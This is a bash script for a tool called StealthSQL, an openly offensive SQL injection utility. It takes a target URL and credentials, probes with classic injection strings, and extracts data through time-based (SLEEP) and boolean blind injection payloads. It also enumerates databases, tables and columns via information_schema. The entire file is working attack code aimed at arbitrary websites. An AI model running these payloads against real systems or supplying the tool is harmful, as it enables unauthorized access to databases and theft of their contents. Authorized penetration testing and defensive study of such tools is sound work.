#!/bin/bash


print_banner() {
    local banner=(
        "******************************************"
        "*                StealthSQL              *"
        "*             SQL Injection Tool         *"
        "*                  v2.0.1                *"
        "*      ----------------------------      *"
        "*                        by @ImKKingshuk *"
        "* Github- https://github.com/ImKKingshuk *"
        "******************************************"
    )
    local width=$(tput cols)
    for line in "${banner[@]}"; do
        printf "%*s\n" $(((${#line} + width) / 2)) "$line"
    done
    echo
}


make_request() {
    local url="$1"
    local headers=()
    if [ -n "$session_cookie" ]; then
        headers+=("-H" "Cookie: $session_cookie")
    fi
    if [ -n "$auth_token" ]; then
        headers+=("-H" "Authorization: Bearer $auth_token")
    fi
    if [ -n "$custom_headers" ]; then
        IFS=',' read -ra hdrs <<< "$custom_headers"
        for hdr in "${hdrs[@]}"; do
            headers+=("-H" "$hdr")
        done
    fi
    curl -s -k -A "$user_agent" --proxy "$proxy" "${headers[@]}" "$url"
}


color_print() {
    clear
    echo -e "$output" | awk 'BEGIN {print "\033[1;32m"} {print} END {print "\033[0m"}'
    sleep 1
}


color_print_attempt() {
    clear
    echo -e "\033[1;32m$output\033[0m"
    echo -e "\033[1;31m[*] Trying: $1\033[0m"
}


encode_payload() {
    local payload="$1"
    echo -n "$payload" | jq -sRr @uri
}


get_query_output() {
    local query="$1"
    local row_number="$2"
    local is_count="$3"
    local flag=true
    local query_output=""
    local temp_query_output=""
    local dictionary

    if [ "$is_count" == true ]; then
        dictionary="0123456789"
    else
        dictionary="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~"
    fi

    while [ "$flag" = true ]; do
        flag=false
        for ((j = 1; j < 1000; j++)); do
            for ((i = 0; i < ${#dictionary}; i++)); do
                temp_query_output="$query_output${dictionary:$i:1}"
                color_print_attempt "$temp_query_output"

                if [ "$method" == "T" ]; then
                    if [ "$is_count" == true ]; then
                        payload="' AND IF(MID((SELECT COUNT(*) FROM ($query) AS totalCount),$j,1)='${dictionary:$i:1}',SLEEP($time_sleep),0)--+"
                        echo -e "\nGetting rows count...\n"
                    else
                        payload="' AND IF(MID(($query LIMIT $row_number,1),$j,1)='${dictionary:$i:1}',SLEEP($time_sleep),0)--+"
                        echo -e "\nScanning row $(($row_number + 1))/$total_rows...\n"
                    fi
                    full_url="$url$(encode_payload "$payload")"
                    start_time=$(date +%s)
                    make_request "$full_url" > /dev/null
                    elapsed_time=$(( $(date +%s) - start_time ))
                    if [ "$elapsed_time" -ge "$time_sleep" ]; then
                        flag=true
                        break
                    fi
                elif [ "$method" == "B" ]; then
                    if [ "$is_count" == true ]; then
                        payload="' AND (MID((SELECT COUNT(*) FROM ($query) AS totalCount),$j,1))!'${dictionary:$i:1}'--+"
                        echo -e "\nGetting rows count...\n"
                    else
                        payload="' AND (MID(($query LIMIT $row_number,1),$j,1))!'${dictionary:$i:1}'--+"
                        echo -e "\nScanning row $(($row_number + 1))/$total_rows...\n"
                    fi
                    full_url="$url$(encode_payload "$payload")"
                    response=$(make_request "$full_url")
                    current_length=$(echo -n "$response" | wc -c)
                    if [ "$current_length" -ne "$default_length" ]; then
                        flag=true
                        break
                    fi
                fi
                flag=false
            done
            if [ "$flag" = true ]; then
                query_output="$temp_query_output"
                continue
            fi
            break
        done
    done

    echo "$query_output"
}


blind_sql_injection() {
    local method="$1"
    local query_input="$2"
    local total_rows query_output current_output total_output
    local initial_time=$(date +%s)

    if [ "$method" == "B" ]; then
        echo "Using Boolean Blind SQL Injection"
        default_length=$(make_request "$url" | wc -c)
    else
        time_sleep=${3:-3}
        echo "Using Time-Based Blind SQL Injection with ${time_sleep}s sleep time"
        sleep 1
    fi

    total_rows=$(get_query_output "$query_input" 0 true)
    output+="\nTotal rows: $total_rows\n"
    color_print

    for ((i = 0; i < total_rows; i++)); do
        current_output=$(get_query_output "$query_input" "$i")
        output+="\n[+] Query output: $current_output"
        total_output="$output\n"
        color_print
    done

    if [ "$total_rows" -gt 1 ]; then
        echo -e "\n[+] All rows:\n"
        output="$total_output"
        color_print
    fi

    local total_time=$(( $(date +%s) - initial_time ))
    echo "Total time: $(date -u -d @$total_time +'%H:%M:%S') seconds!"
}


detect_sqli() {
    local url="$1"
    local payloads=(
        "' OR '1'='1"
        "' OR '1'='1' -- "
        "\" OR \"1\"=\"1"
        "\" OR \"1\"=\"1\" -- "
        "' AND 1=1 -- "
    )
    echo "Detecting SQL injection vulnerabilities..."
    for payload in "${payloads[@]}"; do
        full_url="$url$(encode_payload "$payload")"
        response=$(make_request "$full_url")
        if [[ "$response" =~ "error" || "$response" =~ "syntax" ]]; then
            echo "Potential SQL Injection found with payload: $payload"
            return 0
        fi
    done
    echo "No SQL Injection vulnerabilities detected."
    return 1
}


enumerate() {
    local query="$1"
    local data_type="$2"
    case $data_type in
        databases)
            query="SELECT schema_name FROM information_schema.schemata"
            ;;
        tables)
            query="SELECT table_name FROM information_schema.tables WHERE table_schema = '$query'"
            ;;
        columns)
            query="SELECT column_name FROM information_schema.columns WHERE table_name = '$query'"
            ;;
        *)
            echo "Invalid data type for enumeration."
            return 1
            ;;
    esac
    blind_sql_injection "$method" "$query"
}


generate_report() {
    local format="$1"
    local report_file="sqli_report.$format"
    echo -e "$output" > "$report_file"
    echo "Report generated: $report_file"
}


main() {
    print_banner
    read -p "Enter the target URL (e.g., https://www.example.com): " url
    url="${url%/}"

    read -p "Enter the session cookie (if any, press Enter to skip): " session_cookie
    read -p "Enter the authentication token (if any, press Enter to skip): " auth_token
    read -p "Enter the proxy (if any, press Enter to skip): " proxy
    read -p "Enter custom headers (comma separated, if any, press Enter to skip): " custom_headers
    read -p "Enter the User-Agent (if any, press Enter to use default): " user_agent
    user_agent="${user_agent:-Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36}"

    while true; do
        read -p "SQLi type [T/B]: " method
        read -p "SQL query: " query_input
        if [[ ! "$query_input" == *"*"* ]]; then
            break
        fi
        echo "Please specify a column name!"
    done

    read -p "Enable verbose mode? (y/n): " verbose
    if [ "$verbose" == "y" ]; then
        set -x
    fi

    detect_sqli "$url"
    blind_sql_injection "$method" "$query_input"

    read -p "Would you like to enumerate databases, tables, or columns? (databases/tables/columns/none): " enum_choice
    if [ "$enum_choice" != "none" ]; then
        read -p "Enter the name for enumeration (leave empty for databases): " enum_name
        enumerate "$enum_name" "$enum_choice"
    fi

    read -p "Generate report? (y/n): " generate_report_choice
    if [ "$generate_report_choice" == "y" ]; then
        read -p "Enter report format (html/json/csv): " report_format
        generate_report "$report_format"
    fi
}

main
